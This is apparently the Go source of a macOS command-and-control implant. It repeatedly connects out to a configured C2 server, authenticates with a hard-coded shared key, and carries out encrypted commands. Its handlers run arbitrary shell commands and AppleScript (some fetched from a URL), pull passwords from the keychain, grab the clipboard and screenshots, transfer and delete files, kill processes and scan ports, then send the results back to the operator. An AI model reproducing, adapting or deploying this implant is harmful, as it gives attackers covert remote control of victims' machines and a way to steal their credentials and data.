package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	encryption "github.com/grines/minic2/common"
	"github.com/grines/minic2/osx"
	syscall "github.com/grines/minic2/payload_func"
)

const (
	PSKPayload = "thisiscoolthisiscool1234" // 16/24 char PSK // shared psk with client/server/implants
	target     = "0.0.0.0"                  // C2 Server
	port       = "8008"
)

func main() {
	fullTarget := net.JoinHostPort(target, port)
	fmt.Println("Running @:", fullTarget)

	for {
		conn, err := net.Dial("tcp", fullTarget)
		if err != nil {
			log.Printf("Error connecting: %v\n", err)
			time.Sleep(time.Duration(rand.Intn(26)+5) * time.Second)
			continue
		}

		handleConnection(conn)
	}
}

func generateResponse(challenge, psk string) string {
	hash := sha256.Sum256([]byte(challenge + psk))
	return fmt.Sprintf("%x", hash)
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	challenge, err := reader.ReadString('\n')
	if err != nil {
		log.Printf("Error reading challenge: %v\n", err)
		return
	}

	response := generateResponse(strings.TrimSpace(challenge), PSKPayload)
	conn.Write([]byte(response + "\n"))

	currentDir, err := os.Getwd()
	if err != nil {
		log.Printf("Error getting current directory: %v\n", err)
		return
	}

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading command: %v\n", err)
			break
		}

		command := strings.TrimSpace(message)
		log.Printf("Command received: %s", command)

		decryptedCommand, err := encryption.Decrypt(command, PSKPayload)
		if err != nil {
			log.Printf("Error: %s", err)
			continue
		}
		log.Printf("Decrypted Command: %s", decryptedCommand)

		executeCommand(decryptedCommand, conn, &currentDir)
	}
}

func executeCommand(command string, conn net.Conn, currentDir *string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "osascript":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no data specified"))
			break
		}
		osx.Run(parts[1])
		sendResponse(conn, "Osacript Executed")
	case "osascript_url":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no url specified"))
			break
		}
		osx.Run_url(parts[1])
		sendResponse(conn, "Osacript Executed")
	case "env":
		environ := syscall.Env()
		sendResponse(conn, environ)
	case "ping":
		sendResponse(conn, "pong")
	case "whoami":
		who, err := syscall.Whoami()
		if err != nil {
			sendError(conn, err)
			break
		}
		user := fmt.Sprintf("%v", who)
		sendResponse(conn, user)
	case "ps":
		processes := syscall.Ps()
		flattened := strings.Join(processes, "\n")
		sendResponse(conn, flattened)
	case "clipboard":
		clip := osx.Clipboard()
		sendResponse(conn, clip)
	case "screenshot":
		clip := osx.Screencapture()
		fmt.Println(clip[0].Data())
		fileContent, err := ioutil.ReadFile(parts[1])
		if err != nil {
			sendError(conn, err)
			break
		}
		sendResponse(conn, string(fileContent))
	case "cd":
		// Find the index of the first space
		fmt.Println(command)
		spaceIndex := strings.Index(command, " ")
		if spaceIndex == -1 || spaceIndex == len(command)-1 {
			sendError(conn, fmt.Errorf("no directory specified"))
			break
		}

		// Extract the directory path
		dirPath := command[spaceIndex+1:]

		// Change directory
		if err := os.Chdir(dirPath); err != nil {
			sendError(conn, err)
		} else {
			*currentDir, _ = os.Getwd()
			sendResponse(conn, "Changed directory to "+*currentDir)
		}
	case "download":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no file specified"))
			break
		}
		fileContent, err := ioutil.ReadFile(parts[1])
		if err != nil {
			sendError(conn, err)
			break
		}
		sendResponse(conn, string(fileContent))
	case "upload":
		if len(parts) < 3 {
			sendError(conn, fmt.Errorf("incorrect upload command"))
			break
		}

		remotePath := parts[1]
		data, err := base64.StdEncoding.DecodeString(parts[2])
		if err != nil {
			sendError(conn, fmt.Errorf("error decoding file data"))
			break
		}

		err = ioutil.WriteFile(remotePath, data, 0644)
		if err != nil {
			sendError(conn, err)
			break
		}

		sendResponse(conn, "File uploaded successfully")
	case "pwd":
		sendResponse(conn, *currentDir)
	case "keychain":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no keychain service specified"))
			break
		}
		password, err := syscall.SecKeychainFindGenericPassword(parts[1])
		if err != nil {
			sendError(conn, fmt.Errorf("keychain service not found"))
			break
		}
		sendResponse(conn, password)
	case "portscan":
		ports := syscall.Portscan()
		sendResponse(conn, ports)
	case "cp":
		if len(parts) < 3 {
			sendError(conn, fmt.Errorf("need: cp filepath tofilepath"))
			break
		}
		syscall.Cp(parts[1], parts[2])
		sendResponse(conn, "Copied")
	case "mv":
		if len(parts) < 3 {
			sendError(conn, fmt.Errorf("need: mv filepath tofilepath"))
			break
		}
		syscall.Mv(parts[1], parts[2])
		sendResponse(conn, "Moved")
	case "curl":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no url specified"))
			break
		}
		curlData, _ := syscall.SimpleCurl(parts[1])
		sendResponse(conn, curlData)
	case "kill":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no PID specified"))
			break
		}
		filedata := syscall.Kill(parts[1])
		sendResponse(conn, string(filedata))
	case "cat":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no file specified"))
			break
		}
		filedata := syscall.Cat(parts[1])
		sendResponse(conn, string(filedata))
	case "rm":
		if len(parts) < 2 {
			sendError(conn, fmt.Errorf("no file specified"))
			break
		}
		syscall.Rm(parts[1])
		sendResponse(conn, "Removed")
	case "ls":
		if len(parts) < 2 {
			filedata, err := syscall.List(".")
			if err != nil {
				sendError(conn, fmt.Errorf("error listing files"))

			}
			flattened := strings.Join(filedata, "\n")
			sendResponse(conn, string(flattened))
			break
		}
		filedata, err := syscall.List(parts[1])
		if err != nil {
			sendError(conn, fmt.Errorf("error listing files"))

		}
		flattened := strings.Join(filedata, "\n")

		sendResponse(conn, string(flattened))

	default:
		cmd := exec.Command("sh", "-c", command)
		cmd.Dir = *currentDir
		output, err := cmd.CombinedOutput()
		if err != nil {
			sendError(conn, err)
			break
		}
		sendResponse(conn, string(output))
	}
}

func sendError(conn net.Conn, err error) {
	sendEncryptedResponse(conn, err.Error())
}

func sendResponse(conn net.Conn, response string) {
	sendEncryptedResponse(conn, response)
}

func sendEncryptedResponse(conn net.Conn, message string) {
	encryptedMsg, err := encryption.Encrypt(message, PSKPayload)
	if err != nil {
		log.Printf("Error encrypting message: %v\n", err)
		return
	}

	encodedMsg := base64.StdEncoding.EncodeToString([]byte(encryptedMsg))
	_, err = conn.Write([]byte(encodedMsg + "\n"))
	if err != nil {
		log.Printf("Error sending message: %v\n", err)
	}
}
